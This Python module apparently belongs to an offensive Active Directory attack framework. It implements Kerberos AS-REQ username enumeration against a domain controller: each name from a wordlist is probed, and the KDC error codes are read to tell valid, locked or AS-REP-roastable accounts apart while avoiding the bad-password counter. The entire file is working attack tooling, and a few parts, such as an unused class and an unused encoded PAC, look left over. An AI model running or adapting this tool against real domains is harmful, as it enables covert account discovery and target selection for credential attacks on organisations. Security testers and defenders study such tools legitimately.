"""AS-REQ username validator.

Sends a Kerberos AS-REQ per candidate and classifies the KDC error to
determine whether the account exists — without incrementing badPwdCount.
Valid users return KDC_ERR_PREAUTH_REQUIRED (or KDC_ERR_ETYPE_NOSUPP);
unknown users return KDC_ERR_C_PRINCIPAL_UNKNOWN. AS-REP roastable users
return the AS-REP itself.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

from rich.console import Console

from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.impacket_helper import require_impacket
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()

_CODE_MAP = {
    "KDC_ERR_C_PRINCIPAL_UNKNOWN": ("unknown", False),
    "KDC_ERR_PREAUTH_REQUIRED": ("valid", True),
    "KDC_ERR_PREAUTH_FAILED": ("valid", True),
    "KDC_ERR_CLIENT_REVOKED": ("locked_or_disabled", True),
    "KDC_ERR_ETYPE_NOSUPP": ("valid", True),
}


def _probe_user(username: str, domain: str, dc_ip: str) -> dict[str, Any]:
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import AS_REP, AS_REQ, KERB_PA_PAC_REQUEST
    from impacket.krb5.kerberosv5 import sendReceive
    from impacket.krb5.types import KerberosTime, Principal
    from pyasn1.codec.der.decoder import decode
    from pyasn1.codec.der.encoder import encode
    import datetime as _dt

    client_name = Principal(
        username, type=constants.PrincipalNameType.NT_PRINCIPAL.value
    )
    as_req = AS_REQ()
    as_req["pvno"] = 5
    as_req["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)

    padata_seq = KERB_PA_PAC_REQUEST()
    padata_seq["include-pac"] = True
    encoded_pac = encode(padata_seq)
    as_req["padata"] = None  # populated below

    from pyasn1.type import namedtype, univ

    class Sequence(univ.Sequence):
        pass

    req_body = as_req["req-body"]
    opts = list("00000000000000010000000000000000")  # canonicalize
    req_body["kdc-options"] = "".join(opts)

    req_body["cname"] = None
    _ = client_name.components_to_asn1(req_body["cname"])
    server = Principal(
        f"krbtgt/{domain.upper()}", type=constants.PrincipalNameType.NT_SRV_INST.value
    )
    req_body["sname"] = None
    _ = server.components_to_asn1(req_body["sname"])
    req_body["realm"] = domain.upper()
    now = _dt.datetime.now(_dt.timezone.utc)
    req_body["till"] = KerberosTime.to_asn1(now + _dt.timedelta(days=1))
    req_body["rtime"] = KerberosTime.to_asn1(now + _dt.timedelta(days=1))
    req_body["nonce"] = 0x12345678
    etypes = univ.SequenceOf(componentType=univ.Integer())
    for et in (
        constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value,
        constants.EncryptionTypes.rc4_hmac.value,
        constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value,
    ):
        etypes.append(int(et))
    req_body["etype"] = etypes

    encoded = encode(as_req)
    try:
        response = sendReceive(encoded, domain.upper(), dc_ip)
    except Exception as exc:  # noqa: BLE001
        text = str(exc)
        for code, (state, valid) in _CODE_MAP.items():
            if code in text:
                return {"user": username, "state": state, "valid": valid, "kdc_error": code}
        return {"user": username, "state": "error", "valid": False, "kdc_error": text[:200]}
    try:
        as_rep = decode(response, asn1Spec=AS_REP())[0]
        return {
            "user": username,
            "state": "asreproastable",
            "valid": True,
            "as_rep_bytes": len(response),
            "no_preauth": True,
        }
    except Exception:  # noqa: BLE001
        return {"user": username, "state": "valid", "valid": True}


@register_capability(
    id="asreq-userhunt",
    summary="Validate usernames via Kerberos AS-REQ without incrementing badPwdCount",
    category="enumeration",
    tags=("kerberos", "as-req", "user-enum", "asrep-roast"),
)
class AsreqUserhunt:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_impacket("asreq-userhunt")
        userlist_path = kwargs.get("users") or kwargs.get("userlist")
        if not userlist_path:
            raise RuntimeError("Pass -P users=<path-to-user-list>.")
        path = Path(str(userlist_path)).expanduser()
        if not path.is_file():
            raise RuntimeError(f"user list not found: {path}")
        candidates = [line.strip() for line in path.read_text(encoding="utf-8").splitlines() if line.strip()]

        console.print(f"[bold]AS-REQ user hunt[/bold]  candidates={len(candidates)}")

        results: list[dict[str, Any]] = []
        for user in candidates:
            record = _probe_user(user, target.domain, target.dc_ip)
            results.append(record)
            state = record.get("state", "?")
            color = "green" if record.get("valid") else "dim"
            console.print(f"  [{color}]{state:>18}[/{color}]  {user}")
            if record.get("valid"):
                node = f"USER@{user.upper()}@{target.domain.upper()}"
                graph.add_node(node, "User", sam=user, source="asreq")
                graph.add_edge(node, node, "AsReqValid")
                if record.get("no_preauth"):
                    graph.add_edge(node, node, "AsRepRoastable")

        valid = [r for r in results if r.get("valid")]
        asreproastable = [r for r in results if r.get("no_preauth")]
        payload = {
            "domain": target.domain,
            "count": len(results),
            "valid": len(valid),
            "asreproastable": len(asreproastable),
            "entries": results,
        }
        out = session.path("asreq-userhunt.json")
        out.write_text(json.dumps(payload, indent=2, default=str), encoding="utf-8")
        graph.save(session.path("graph.json"))
        session.log(
            "asreq-userhunt.complete", count=len(results), valid=len(valid),
        )
        console.print(
            f"[green]Done[/green]  valid={len(valid)}  asreproastable={len(asreproastable)}"
        )
        return payload
